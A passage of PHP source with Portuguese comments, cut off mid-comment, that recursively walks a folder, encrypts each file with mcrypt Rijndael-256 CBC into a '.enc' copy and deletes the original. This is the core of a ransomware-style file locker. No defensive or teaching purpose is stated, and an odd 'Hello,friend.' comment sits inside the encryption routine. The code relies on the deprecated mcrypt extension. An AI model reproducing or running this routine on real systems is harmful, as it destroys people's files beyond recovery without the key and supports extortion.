<?php
// Define o caminho para o diretório de arquivos
$folder = '/path/to/folder';
// Função para criptografar um arquivo
function encrypt_file($file, $key) {
// Abre o arquivo original
  $plaintext = file_get_contents($file);
  // Inicializa o modo de cifra e algoritmo de criptografia
$td = mcrypt_module_open(MCRYPT_RIJNDAEL_256, '', MCRYPT_MODE_CBC, '');

// Obtém o tamanho do IV (vetor de inicialização)
$iv_size = mcrypt_enc_get_iv_size($td);

// Cria um IV aleatório
$iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);

// Inicializa a cifra com a chave e o IV
mcrypt_generic_init($td, $key, $iv);

// Criptografa o texto claro
$ciphertext = mcrypt_generic($td, $plaintext);

// Adiciona o IV ao texto cifrado para poder decifrar posteriormente
$ciphertext = $iv . $ciphertext;

// Fecha a cifra
mcrypt_generic_deinit($td);
mcrypt_module_close($td);

// Salva o texto cifrado em um novo arquivo
file_put_contents($file . '.enc', $ciphertext);

// Exclui o arquivo original
unlink($file);

//Hello,friend. EIJIABE
  }

// Função para percorrer o diretório de forma recursiva e criptografar todos os arquivos
function encrypt_folder_recursive($folder, $key) {
// Abre o diretório
$dir = opendir($folder);
  // Percorre o diretório
while (($file = readdir($dir)) !== false) {
    // Ignora os diretórios "." e ".."
    if ($file == '.' || $file == '..') {
        continue;
    }

    // Obtém o caminho completo do arquivo
    $path = $folder . '/' . $file;

    // Verifica se é um arquivo regular
    if (is_file($path)) {
        // Chama a função para criptografar o arquivo
        encrypt_file($path, $key);
    }
    // Ver
